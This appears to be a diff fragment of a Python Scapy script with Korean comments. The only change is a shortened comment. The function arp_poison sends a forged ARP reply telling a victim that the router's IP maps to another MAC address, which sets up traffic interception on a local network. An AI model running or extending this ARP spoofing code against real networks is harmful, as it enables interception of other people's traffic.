@@ -35,7 +35,7 @@ def get_rout_mac(ip_addr): # IP 값을 받는 라우터 MAC 주소 추출 함수
 
 def arp_poison(routerIP, victimIP, routerMAC, victimMAC): # 라우터 IP, 피해자 IP, 라우터 MAC, 피해자 MAC 주소를 받는 함수 선언
 
-	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)) # 입력받는 정보를 통해 피해자에게 라우터의 MAC주소를 속이는 패킷을 전송
+	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)) # 라우터의 MAC 주소를 속이는 패킷을 전송
 
 print "\n[!] Check Victim MAC Address\n"
 
